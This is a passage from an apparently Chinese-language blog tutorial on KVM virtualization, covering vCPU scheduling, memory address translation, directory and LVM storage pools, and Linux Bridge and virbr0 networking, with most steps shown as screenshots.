alt="image-20200703140828672"></p><p>从上图可以看到，主机有两个物理CPU，有两个虚拟机vm1和vm2。vm1有2个vCPU，vm2有4个vCPU，所有vm1有2个线程，vm2有4个线程在两个物理CPU上调度。</p><p>注：虚拟机的vCPU总数可以超过物理CPU数量（CPU overcommit）。这样虚拟机可以充分利用宿主机的CPU资源，前提是所有虚拟机不能在同一时刻都满负荷运行。</p><h2 id="内存虚拟化"><a href="#内存虚拟化" class="headerlink" title="内存虚拟化"></a>内存虚拟化</h2><p>KVM通过内存虚拟机共享物理系统内存，动态分配给虚拟机。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrhhok0jj316o0dwgud.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrhhok0jj316o0dwgud.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703142115687"></p><p>为了能够在一台主机上运行多个虚拟机。KVM实现VA（虚拟内存）-&gt;PA（物理内存）-&gt;MA（机器内存）之间的地址转换。</p><p>虚拟OS控制虚拟地址到客户内存物理地址的映射。VA-&gt;PA</p><p>KVM负责客户物理内存到实际机器内存的映射。PA-&gt;MA</p><p>注：内存也可以overcommit。</p><h2 id="KVM存储虚拟化"><a href="#KVM存储虚拟化" class="headerlink" title="KVM存储虚拟化"></a>KVM存储虚拟化</h2><p>KVM存储虚拟化是通过存储池（Storage Pool）和卷（Volume）来管理的。</p><p><strong>Storage Pool</strong>：主机上可以看到的一片存储空间，可以是多种类型。</p><p><strong>Volume</strong>：在Storage Pool中划分出的一块空间，主机将Volume分配给虚拟机，Volume在虚拟机视角就是一块硬盘。</p><p>下面介绍三种不同类型的Storage Pool：</p><h3 id="目录类型的Storage-Pool"><a href="#目录类型的Storage-Pool" class="headerlink" title="目录类型的Storage Pool"></a>目录类型的Storage Pool</h3><p>最常用的Storage Pool类型。</p><p>KVM将主机目录/var/lib/libvirt/images/作为默认的Storage Pool。（KVM所有可以使用的Storage Pool都定义在主机的/etc/libvirt/storage目录下，每个Pool都一个xml文件，可以查看其默认位置）</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrufz1csj314k0lognq.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrufz1csj314k0lognq.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703143343301"></p><p>Volume就是该目录下的文件，一个文件就是一个Volume。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrqp5gvvj315m0tmdhn.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrqp5gvvj315m0tmdhn.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703143006679"></p><p>文件cirros***.img就是一个Volume。从KVM1视角来看，就是启动磁盘。</p><h4 id="为kvm1添加新的磁盘"><a href="#为kvm1添加新的磁盘" class="headerlink" title="为kvm1添加新的磁盘"></a>为kvm1添加新的磁盘</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdry8802wj314k0u0450.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdry8802wj314k0u0450.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703143720656"></p><p>新的磁盘信息</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdryph1jmj31ai0co0u6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdryph1jmj31ai0co0u6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703143749153"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrzmnxsjj314a05674s.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdrzmnxsjj314a05674s.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703143841683"></p><p>使用文件做Volume有很多优点：存储方便、移植性好、可复制、<strong>可远程访问</strong>。</p><p><strong>远程访问</strong>：镜像文件不一定都放置到宿主机本地文件系统中，也可以存储在通过网络连接的远程文件系统（NFS\GlusterFS），使得镜像文件可以在多个主机之间共享，便于虚拟机在不同主机之间做Live Migration。在分布式文件系统中多副本的特性还可以保证镜像文件的高可用性。</p><p>KVM支持多种Volume文件格式（raw、qcow2、vmdk）</p><p><strong>raw</strong>：默认格式（原始磁盘镜像格式），移植性好，性能好，但是大小固定，不能节省磁盘空间。</p><p><strong>qcow2</strong>：推荐格式，cow表示copy on write，能够节省磁盘空间，支持AES加密，zlib压缩，也支持多快照。</p><p><strong>vmdk</strong>：VMware的虚拟磁盘格式，VMware可以直接在KVM上跑。</p><h3 id="LVM类型的Storage-Pool"><a href="#LVM类型的Storage-Pool" class="headerlink" title="LVM类型的Storage Pool"></a>LVM类型的Storage Pool</h3><p>主机上VG中的LV可以作为虚拟磁盘分配给虚拟机使用。</p><p>LV由于没有磁盘的MBR引导记录，不能作为虚拟机的启动盘，只能作为数据盘使用。</p><p>主机的VG就是一个Storage Pool，VG中的LV就是Volume。</p><p>优点：拥有较好的性能</p><p>缺点：管理和移动性方面不如镜像文件，而且不能通过网络远程使用。</p><p>Step1：创建VG。命名为HostVG</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdt83pz9jj30hd09r783.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdt83pz9jj30hd09r783.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703152126565"></p><p>Step2：创建Storage Pool定义文件Host.xml</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdt8cdzrrj308504tabh.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdt8cdzrrj308504tabh.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703152140684"></p><p>Step3：通过virsh命令创建新的Storage Pool “HostVG”并启动HostVG</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdt8m9cqxj30fx06bdir.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdt8m9cqxj30fx06bdir.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703152156354"><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtkk7go2j30c8046wfu.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtkk7go2j30c8046wfu.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153324905"></p><p>Step4：在Virt-manager中为虚拟机KVM1添加LV的虚拟磁盘</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtl13dokj30h20axjv2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtl13dokj30h20axjv2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153352100"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtlct0nqj30gm0g6tc2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtlct0nqj30gm0g6tc2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153410624"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtlo3c9uj30ia0a5409.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtlo3c9uj30ia0a5409.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153425968"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtlt74tcj30i90cowk6.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtlt74tcj30i90cowk6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153437263"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtm8muv5j30i80a2wh0.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtm8muv5j30i80a2wh0.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153501590"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtmm2wt5j30gn0gjn0q.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtmm2wt5j30gn0gjn0q.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153523423"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtmu2q2lj30ge09cadt.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtmu2q2lj30ge09cadt.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153535769"></p><p>Step5：查看主机上多出来的LV</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtn062jrj30hn07wgpm.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdtn062jrj30hn07wgpm.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703153546105"></p><h3 id="其他类型的Storage-Pool"><a href="#其他类型的Storage-Pool" class="headerlink" title="其他类型的Storage Pool"></a>其他类型的Storage Pool</h3><p>KVM 还支持 iSCSI，Ceph 等多种类型的 Storage Pool。目前使用最多的就是目录类型。</p><h2 id="网络虚拟化"><a href="#网络虚拟化" class="headerlink" title="网络虚拟化"></a>网络虚拟化</h2><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdu4wlfvjj30nh0fj7if.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdu4wlfvjj30nh0fj7if.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703155256207"></p><p>网络虚拟化中两个最重要的东西：<strong>Linux Bridge</strong>和<strong>VLAN</strong>。</p><h3 id="Linux-Bridge"><a href="#Linux-Bridge" class="headerlink" title="Linux Bridge"></a>Linux Bridge</h3><p>假设主机有1块与外网连接的物理网卡eth0，如何让vm1能够访问外网？</p><p>方案一：直接将物理网卡分配给vm1。但是主机和vm2没有网卡，就不能访问外网了。</p><p>方案二：利用Linux Bridge作为中间模块，将eth0与vnet0连接起来。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gge82pqpasj30ck0b3myr.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gge82pqpasj30ck0b3myr.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703235514169"></p><h3 id="KVM环境下实现Linux-Bridge"><a href="#KVM环境下实现Linux-Bridge" class="headerlink" title="KVM环境下实现Linux Bridge"></a>KVM环境下实现Linux Bridge</h3><h4 id="Step1：配置Linux-Bridge-br0-（网桥）"><a href="#Step1：配置Linux-Bridge-br0-（网桥）" class="headerlink" title="Step1：配置Linux Bridge br0)（网桥）"></a>Step1：配置Linux Bridge br0)（网桥）</h4><p>Step1-1：查看网络脚本目录，只有以太网卡eth0的配置</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1hp6ml5j315405674n.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1hp6ml5j315405674n.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165259203"></p><p>Step1-2：查看以太网卡ifcfg-eth0的内容</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1i8mab7j31500g6jsx.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1i8mab7j31500g6jsx.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165332017"></p><p>Step1-3：查看当前连接</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1iy81aaj314u03wq38.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1iy81aaj314u03wq38.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165413499"></p><p>Step1-4：新建网桥br0并查看ifcfg-br0</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1jt70bbj314k0p2770.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1jt70bbj314k0p2770.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165502602"></p><p>Step1-5：查看当前连接</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1k3hdk1j314e052gm2.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1k3hdk1j314e052gm2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165519080"></p><p>Step1-6：将网桥br0桥接至eth0并查看刚生成的ifcfg-bridge-slave-eth0文件</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1kgzpp7j31440a4t9x.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1kgzpp7j31440a4t9x.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165541305"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1ks6gr3j314e06uaal.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1ks6gr3j314e06uaal.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165559338"></p><p>Step1-7：查看当前连接</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1lhncrbj314o064js1.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1lhncrbj314o064js1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165639479"></p><p>Step1-8：关闭eth0，打开网桥br，查看当前连接</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1lt7lg1j314o0butaf.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1lt7lg1j314o0butaf.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704165658562"></p><h4 id="Step2：配置VM1"><a href="#Step2：配置VM1" class="headerlink" title="Step2：配置VM1"></a>Step2：配置VM1</h4><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1s8npdgj30z30u0tdc.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf1s8npdgj30z30u0tdc.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704170308796"></p><p>Step2-2：查看VM1 IP地址以及是否能访问外网</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf29oavq0j314s0h4aav.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf29oavq0j314s0h4aav.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704171953868"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf291k5gvj314m09sweu.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggf291k5gvj314m09sweu.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200704171917822"></p><p>Step2-3：查看VM2 IP地址以及是否能访问VM1和外网</p><h4 id="理解virbr0"><a href="#理解virbr0" class="headerlink" title="理解virbr0"></a>理解virbr0</h4><p>virbr0是KVM默认创建的一个Bridge，作用是为连接其上的虚拟机网卡提供NAT外网的功能。</p><p>virbr0默认分配了一个IP 192.16.8.122.1，并为连接其他虚拟网卡提供DHCP服务。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfw8vcneoj30z20u0aeb.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfw8vcneoj30z20u0aeb.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200705103705538"></p><p>virbr0使用dnsmasq提供DHCP服务，可以在祖籍中查看该进程信息</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwbolz7jj314k092t9v.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwbolz7jj314k092t9v.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200705103948976"></p><p>可以通过ssh连接VM1，VM2同理</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwep8u2dj314s09yta1.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwep8u2dj314s09yta1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200705104242064"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwfqae8ej314i0h60v5.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggfwfqae8ej314i0h60v5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 